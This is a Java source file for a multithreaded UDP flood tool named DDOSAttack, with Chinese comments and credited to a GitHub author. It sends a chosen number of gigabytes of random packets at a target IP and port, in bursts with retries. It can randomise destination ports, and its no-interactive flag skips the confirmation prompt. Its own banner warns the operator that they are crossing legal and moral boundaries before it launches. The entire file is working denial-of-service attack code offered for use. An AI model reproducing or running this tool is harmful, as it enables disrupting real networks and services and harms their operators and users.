import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

public class DDOSAttack {
    // ---------- 共享统计 (LongAdder 低竞争) ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- 配置 ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0; // 每突发秒数
    private static int duration = 0; // 攻击持续时间（秒），0 表示直到发完
    private static int srcPortBase = -1; // -1 表示随机
    private static boolean randomTargetPort = false;
    private static String logFile = null;
    private static boolean noInteractive = false;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;

    // ---------- 预分配 SocketAddress 数组用于随机端口 ----------
    private static InetSocketAddress[] portAddresses;

    // ---------- 主函数 ----------
    public static void main(String[] args) throws Exception {
        // 1. 解析参数
        parseArgs(args);

        // 2. 设置日志
        if (logFile != null) {
            logWriter = new PrintWriter(new FileWriter(logFile, true));
            logWriter.println("--- 攻击会话开始于 " + new Date() + " ---");
            logWriter.flush();
        }

        // 3. 显示横幅（艺术字 + 警告）
        showBanner();

        // 4. 验证目标
        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            log("无效的目标 IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            log("端口超出范围。");
            System.exit(1);
        }

        // 5. 验证包大小
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65507) packetSize = 65507;
        // 重新计算总包数（已在 parseArgs 中计算）
        if (totalPackets <= 0) {
            log("总包数必须大于 0。");
            System.exit(1);
        }

        // 6. 预分配 SocketAddress 数组（如果使用随机端口）
        if (randomTargetPort) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        // 7. 攻击摘要
        log("\n[>] 攻击摘要:");
        log("    目标: " + targetIP + ":" + targetPort + " (UDP)");
        log("    总包数: " + totalPackets);
        log("    包大小: " + packetSize + " 字节");
        log("    线程数: " + numThreads);
        if (srcPortBase >= 0) {
            log("    源端口基数: " + srcPortBase + " (每个线程偏移)");
        }
        if (rateLimit > 0) {
            log("    速率限制: " + rateLimit + " 秒/突发");
        }
        if (duration > 0) {
            log("    持续时间: " + duration + " 秒");
        }
        if (randomTargetPort) {
            log("    随机目标端口: 开启");
        }
        log("    突发大小: " + burstSize);
        log("    最大重试: " + maxRetries);

        // 8. 确认
        if (!noInteractive) {
            System.out.print("\n[!] 确认攻击 (yes/no): ");
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            String confirm = reader.readLine().trim().toLowerCase();
            if (!"yes".equals(confirm)) {
                log("[>] 已取消。");
                if (logWriter != null) logWriter.close();
                System.exit(0);
            }
        }

        // 9. 准备载荷
        byte[] payload = new byte[packetSize];
        new Random().nextBytes(payload);

        // 10. 开始攻击
        startAttack(payload);

        // 11. 清理
        if (logWriter != null) logWriter.close();
    }

    // ---------- 健壮的参数解析 ----------
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) {
            System.err.println("缺少 -t/--target");
            System.exit(1);
        }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr != null) targetPort = Integer.parseInt(portStr);
        else { System.err.println("缺少 -p/--port"); System.exit(1); }

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr != null) {
            double gb = Double.parseDouble(gbStr);
            params.put("_gb_value", String.valueOf(gb));
        } else {
            System.err.println("缺少 -g/--gb");
            System.exit(1);
        }

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b") || params.containsKey("--burst"))
            burstSize = Integer.parseInt(params.getOrDefault("-b", params.get("--burst")));
        if (params.containsKey("-r") || params.containsKey("--rate"))
            rateLimit = Double.parseDouble(params.getOrDefault("-r", params.get("--rate")));
        if (params.containsKey("-d") || params.containsKey("--duration"))
            duration = Integer.parseInt(params.getOrDefault("-d", params.get("--duration")));
        if (params.containsKey("-s") || params.containsKey("--src-port"))
            srcPortBase = Integer.parseInt(params.getOrDefault("-s", params.get("--src-port")));
        if (params.containsKey("--size"))
            packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port"))
            randomTargetPort = true;
        if (params.containsKey("--log"))
            logFile = params.get("--log");
        if (params.containsKey("--no-interactive"))
            noInteractive = true;
        if (params.containsKey("--max-retries"))
            maxRetries = Integer.parseInt(params.get("--max-retries"));

        // 从 _gb_value 计算总包数
        double gb = Double.parseDouble(params.getOrDefault("_gb_value", "0"));
        if (gb <= 0) { System.err.println("GB 必须大于 0"); System.exit(1); }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) { System.err.println("流量太小"); System.exit(1); }
    }

    // ---------- 日志 ----------
    private static void log(String msg) {
        System.out.println(msg);
        if (logWriter != null) {
            logWriter.println(msg);
            logWriter.flush();
        }
    }

    // ---------- 横幅 ----------
    private static void showBanner() {
        clearScreen();
        // 运行 figlet DDOS-Attack
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"figlet", "DDOS-Attack"});
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }
            }
            p.waitFor();
        } catch (Exception e) {
            // 降级 ASCII 艺术
            System.out.println(" ____  ____   ___  ____          _   _   _             _     ");
            System.out.println("|  _ \\|  _ \\ / _ \\/ ___|        / \\ | |_| |_ __ _  ___| | __ ");
            System.out.println("| | | | | | | | | \\___ \\ _____ / _ \\| __| __/ _` |/ __| |/ / ");
            System.out.println("| |_| | |_| | |_| |___) |_____/ ___ \\ |_| || (_| | (__|   <  ");
            System.out.println("|____/|____/ \\___/|____/     /_/   \\_\\__|\\__\\__,_|\\___|_|\\_\\ ");
        }
        System.out.println("作者  : BCU-0");
        System.out.println("GitHub: https://github.com/BC-809/DDOS-Attack.git");
        System.out.println();

        System.out.println("==================== 警告 =======================");
        System.out.println("你正在跨越法律和道德的边界。");
        System.out.println("请立即退出，或等待 3 秒后启动。");
        System.out.println("====================================================");
        try {
            for (int i = 3; i > 0; i--) {
                System.out.println(i);
                Thread.sleep(1000);
            }
            System.out.println("启动中...");
            Thread.sleep(500);
        } catch (InterruptedException ignored) {}
        clearScreen();
        // 再次运行 figlet 显示 Attack Starting
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"figlet", "Attack Starting"});
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }
            }
            p.waitFor();
        } catch (Exception e) {
            System.out.println("攻击开始");
        }
        System.out.println();
    }

    private static void clearScreen() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            // 忽略清屏错误
        }
    }

    // ---------- 重试逻辑 ----------
    private static boolean sendWithRetry(DatagramChannel channel, ByteBuffer buffer,
                                         SocketAddress target, int maxRetries) {
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buffer.clear();
                int written = channel.send(buffer, target);
                if (written > 0) {
                    return true;
                }
            } catch (IOException e) {
                // 忽略，继续重试
            }
            attempts++;
        }
        return false;
    }

    // ---------- 攻击 ----------
    private static void startAttack(byte[] payload) throws Exception {
        // 使用固定线程池
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final long startTime = System.currentTimeMillis();

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                ThreadLocalRandom random = ThreadLocalRandom.current();
                try (DatagramChannel channel = DatagramChannel.open()) {
                    channel.configureBlocking(true); // 阻塞模式保证可靠性
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    // 源端口绑定
                    if (srcPortBase >= 0) {
                        int srcPort = srcPortBase + threadId;
                        DatagramSocket socket = channel.socket();
                        try {
                            socket.bind(new InetSocketAddress(srcPort));
                        } catch (BindException e) {
                            log("[!] 线程 " + threadId + ": 绑定端口 " + srcPort +
                                    " 失败，使用随机端口。原因: " + e.getMessage());
                        }
                    }

                    ByteBuffer buffer = ByteBuffer.wrap(payload);
                    long sent = 0;
                    long bytesSent = 0;
                    long dropped = 0;
                    long lastReportedSent = 0;
                    long lastReportedBytes = 0;
                    long lastReportedDropped = 0;

                    while (!stopFlag && sent < pktCount) {
                        int toSend = (int) Math.min(burstSize, pktCount - sent);
                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = random.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            boolean success = sendWithRetry(channel, buffer, targetAddr, maxRetries);
                            if (success) {
                                sent++;
                                bytesSent += packetSize;
                            } else {
                                dropped++;
                            }
                        }

                        // --- 增量更新全局统计 ---
                        long deltaSent = sent - lastReportedSent;
                        long deltaBytes = bytesSent - lastReportedBytes;
                        long deltaDropped = dropped - lastReportedDropped;
                        if (deltaSent > 0) {
                            totalSent.add(deltaSent);
                        }
                        if (deltaBytes > 0) {
                            totalBytes.add(deltaBytes);
                        }
                        if (deltaDropped > 0) {
                            totalDropped.add(deltaDropped);
                        }
                        // 更新上次上报值
                        lastReportedSent = sent;
                        lastReportedBytes = bytesSent;
                        lastReportedDropped = dropped;

                        // 速率限制：如果大于 0 则休眠；否则忙循环
                        if (rateLimit > 0) {
                            Thread.sleep((long) (rateLimit * 1000));
                        }
                    }

                    // 线程结束前最后一次增量更新
                    long deltaSent = sent - lastReportedSent;
                    long deltaBytes = bytesSent - lastReportedBytes;
                    long deltaDropped = dropped - lastReportedDropped;
                    if (deltaSent > 0) totalSent.add(deltaSent);
                    if (deltaBytes > 0) totalBytes.add(deltaBytes);
                    if (deltaDropped > 0) totalDropped.add(deltaDropped);

                } catch (Exception e) {
                    log("线程 " + threadId + " 错误: " + e.getMessage());
                }
            };
            futures.add(executor.submit(task));
        }

        // 进度监控
        Thread monitor = new Thread(() -> {
            long start = System.currentTimeMillis();
            while (!stopFlag) {
                long elapsed = System.currentTimeMillis() - start;
                long sent = totalSent.longValue();
                long bytes = totalBytes.longValue();
                long dropped = totalDropped.longValue();
                if (sent >= totalPackets) break;
                if (duration > 0 && elapsed / 1000 >= duration) {
                    stopFlag = true;
                    break;
                }
                if (elapsed > 0 && sent > 0) {
                    double progress = (double) sent / totalPackets * 100;
                    int barLen = 30;
                    int filled = (int) (barLen * progress / 100);
                    StringBuilder bar = new StringBuilder();
                    for (int i = 0; i < filled; i++) bar.append('█');
                    for (int i = filled; i < barLen; i++) bar.append('░');
                    double eta = (elapsed / (double) sent) * (totalPackets - sent) / 1000;
                    double rate = sent / (elapsed / 1000.0);
                    double dataGB = bytes / (1024.0 * 1024 * 1024);
                    System.out.printf("\r[%s] %.1f%% | %d/%d 包 | %.3f GB | 速率: %.1f pps | 丢弃: %d | 剩余时间: %.0fs",
                            bar, progress, sent, totalPackets, dataGB, rate, dropped, eta);
                }
                try {
                    Thread.sleep(500);
                } catch (InterruptedException ignored) {}
            }
        });
        monitor.setDaemon(true);
        monitor.start();

        // 等待攻击结束
        if (duration > 0) {
            Thread.sleep(duration * 1000L);
            stopFlag = true;
        } else {
            for (Future<?> f : futures) {
                try { f.get(); } catch (Exception ignored) {}
            }
            stopFlag = true;
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }

        // 最终统计
        long elapsed = System.currentTimeMillis() - startTime;
        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        log("\n[>] 攻击结束。");
        log("    发送包数: " + finalSent);
        log("    丢弃包数: " + finalDropped);
        log("    总数据量: " + (finalBytes / (1024.0 * 1024 * 1024)) + " GB");
        log("    耗时: " + (elapsed / 1000.0) + " 秒");
        if (elapsed > 0) {
            log("    平均速率: " + (finalSent / (elapsed / 1000.0)) + " pps");
        }
    }
}
